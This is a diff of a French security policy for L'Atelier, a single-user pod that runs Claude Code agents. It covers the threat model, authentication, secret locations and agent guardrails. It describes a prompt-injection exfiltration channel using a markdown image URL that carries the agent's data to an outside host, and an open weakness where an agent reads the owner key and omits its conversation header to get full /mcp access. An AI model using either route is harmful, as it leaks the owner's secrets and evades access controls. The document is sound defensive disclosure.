@@ -5,11 +5,13 @@
 L'Atelier est conçu pour **un pod, un utilisateur**. Il n'y a qu'une identité
 propriétaire, et elle ouvre tout.
 
-Ce n'est pas une limitation qu'on prévoit de lever au fil de l'eau : le harnais
-lance `claude` avec `--permission-mode bypassPermissions`. Qui obtient un
-identifiant valide obtient l'exécution de code arbitraire sur le pod, donc le
-PVC, la clé du modèle, et tous les jetons amont enregistrés en base. Il n'existe
-pas de « petit » accès à cette API.
+Ce n'est pas une limitation qu'on prévoit de lever au fil de l'eau. Le
+propriétaire peut faire travailler un agent dans n'importe quel mode, jusqu'à
+`bypassPermissions` (« Sans garde-fou », sur confirmation ; le défaut du
+service est `acceptEdits`), et ouvrir un terminal dans VS Code. Qui obtient un
+identifiant valide obtient donc l'exécution de code arbitraire sur le pod, le
+volume, la clé du modèle et tous les jetons amont enregistrés en base. Il
+n'existe pas de « petit » accès à cette API.
 
 Déployé pour plusieurs personnes, il faudrait que chacune ait sa propre
 authentification, sans clé mutualisée derrière l'interface. **Rien dans le code
@@ -19,12 +21,35 @@ ne l'assure aujourd'hui.**
 
 | | |
 |---|---|
-| **Ce qui protège** | l'ingress authentifié d'Onyxia, et la clé propriétaire |
-| **Ce qui ne protège pas** | l'adresse d'origine d'une requête — derrière un ingress, le service ne voit que celle du contrôleur |
+| **Ce qui est exposé** | deux hôtes, par l'ingress d'Onyxia : l'Atelier (port 8787 : interface, `/v1`, `/mcp`, `/vscode/`) et l'hôte des applications (port 8788). L'ingress du chart **n'ajoute aucune authentification** : ces adresses répondent à Internet, et une NetworkPolicy ne laisse entrer que l'ingress. Tout le reste (relais LLM, gardiens, wikichat, créations) écoute en boucle locale |
+| **Ce qui protège** | la clé propriétaire (`atelier_owner_key`), échangée une fois contre un cookie de session `__Host-atelier_session` (HttpOnly, Secure, SameSite=Lax, 7 jours, révocable) ; pour `/mcp`, un consentement OAuth donné avec cette même clé ; pour l'hôte des applications, des codes de passage d'usage unique et un cookie `__Host-atelier_apps` borné à une portée |
+| **Ce qui ne protège pas** | l'adresse d'origine d'une requête : derrière un ingress, le service ne voit que celle du contrôleur |
 | **Ce qu'un accès donne** | tout : exécution sur le pod, secrets, données |
-| **Ce qui est assumé** | `bypassPermissions`, parce que l'utilisateur est le propriétaire du pod |
+| **Ce qui est assumé** | un seul propriétaire, qui décide des modes et des accords |
 
-**Ne pas exposer ce service sans un ingress qui authentifie devant lui.**
+Renouveler la clé (`POST /v1/auth/rotate`) ferme toutes les sessions de
+navigation et révoque tous les jetons OAuth accordés à des clients distants ;
+un client se débranche aussi seul (`DELETE /v1/oauth/clients/{id}`, onglet
+Connecteurs, « Clients distants »).
+
+## Garde-fous entre l'agent et le pod
+
+Ils limitent ce qu'un agent fait par erreur ou sous l'effet d'un contenu piégé ;
+ils ne remplacent pas le modèle ci-dessus.
+
+- **Profils d'accès** filtrés à la source, par le serveur qui expose les outils :
+  un agent code ne reçoit que les outils de son projet
+  ([`docs/vision/profils-acces.md`](docs/vision/profils-acces.md)).
+- **Classes de commandes** vérifiées à chaque appel : une commande engageante
+  appelée par un modèle ne rend qu'un aperçu, une commande réservée lui est
+  refusée ([`docs/fonctionnalites.md`](docs/fonctionnalites.md) §5).
+- **Hook `garde_bash`** : les commandes qui tuent par motif ou écoutent sur
+  `0.0.0.0` sont refusées avant de partir.
+- **Gardiens de sécurité** : ports non déclarés, jetons en clair dans les
+  fichiers que lisent Claude Code ou git, droits des secrets, processus sans
+  garde-fou.
+- **Mémoire** : les transcripts passent par un filtre qui remplace les valeurs
+  secrètes connues par des empreintes avant d'être résumés ou indexés.
 
 ## Où vivent les secrets
 
@@ -33,8 +58,14 @@ Hors du dépôt, dans `~/work/.secrets/` sur le pod, en 0600 :
 - `atelier_owner_key` — la clé propriétaire, au porteur ;
 - `atelier_internal_secret` — le secret partagé qui garde les appels annoncés
   comme internes ;
+- `atelier_lanceur_key` — la clé par laquelle wikichat et les gardiens
+  demandent un lancement d'agent ou un résumé de mémoire ;
 - `llm_api_key` — la clé de la passerelle de modèles ;
-- `vscode_password` — le mot de passe code-server, enregistré par le pod.
+- `github_token` — facultatif, pour publier un projet sur GitHub ;
+- `vscode_password` — le mot de passe code-server, enregistré par le pod ;
+- `claude-env.sh` — l'environnement chargé par `claude` hors de l'Atelier
+  (VS Code, terminal), qui reprend certaines de ces valeurs ;
+- `apps/` — les secrets que déclarent les créations serveur, par nom de fichier.
 
 Aucun de ces fichiers n'est versionné, et rien ne les écrit dans un dossier de
 projet : un dossier de projet se partage et se versionne.
@@ -85,8 +116,8 @@ correctif.
   d'exfiltration classique des interfaces de conversation. Il suffit qu'un
   agent lise une page ou un fichier piégé pour qu'on lui fasse écrire
   `![](https://ailleurs/?d=<ce-qu-il-vient-de-lire>)`, et le navigateur part
-  le livrer en silence au moment de l'affichage. Ici les agents tournent en
-  `bypassPermissions` et lisent ce qu'ils veulent : le canal serait large. Une
+  le livrer en silence au moment de l'affichage. Un agent lit beaucoup, et peut
+  tourner sans garde-fou : le canal serait large. Une
   image d'ailleurs devient donc un lien, que l'on voit avant de le suivre.
   Vérifié dans le navigateur : au rendu d'un message qui en contient une,
   aucune requête ne part vers l'hôte tiers.
@@ -99,8 +130,17 @@ pas celui de la note d'origine.
 ### Ouvert
 
 Les trois défauts que la revue avait relevés sont fermés. Ce qui reste tient
-au modèle, pas à un oubli : un pod, une identité, `bypassPermissions`. C'est
-dit plus haut, et ça ne se corrige pas par un correctif.
+d'abord au modèle, pas à un oubli : un pod, une identité. C'est dit plus haut,
+et ça ne se corrige pas par un correctif.
+
+- **La clé propriétaire est lisible par les agents du pod.** Les serveurs MCP
+  de chaque projet la reçoivent par l'environnement (`ATELIER_MCP_KEY`) pour
+  joindre `/mcp`. Les profils filtrent les outils d'après la conversation qui
+  appelle ; un agent qui lit la clé et omet l'en-tête de sa conversation garde
+  un accès complet à `/mcp` et au mandataire Onyxia. Le fermer demande des
+  capacités courtes, émises par conversation : ce n'est pas fait.
+- **Les identifiants des connecteurs sont en clair dans `gateway.db`**, comme
+  dit plus haut : le fichier est en 0600, sans chiffrement au repos.
 
 ### Déclassé
 
@@ -151,6 +191,13 @@ dit plus haut, et ça ne se corrige pas par un correctif.
 
 ## Signaler une faille
 
-Par courriel à l'adresse de l'auteur du dépôt, plutôt qu'en issue publique s'il
-s'agit d'un défaut exploitable. Ce projet est maintenu par une personne, sur son
-temps ; il n'y a pas de délai de réponse garanti.
+Pas d'issue publique pour un défaut exploitable. Utilisez le signalement privé
+de GitHub : onglet **Security** du dépôt, « Report a vulnerability »
+(<https://github.com/nic01asFr/atelier-sspcloud/security/advisories/new>).
+Décrivez ce qui est touché, comment le reproduire, et la version (chart, image
+ou commit). Ne joignez aucun secret réel : une empreinte ou un extrait masqué
+suffit.
+
+Ce projet est maintenu par une personne, sur son temps ; il n'y a pas de délai
+de réponse garanti. Un correctif de sécurité est publié avec un test qui échoue
+sans lui, et mentionné dans [`CHANGELOG.md`](CHANGELOG.md).
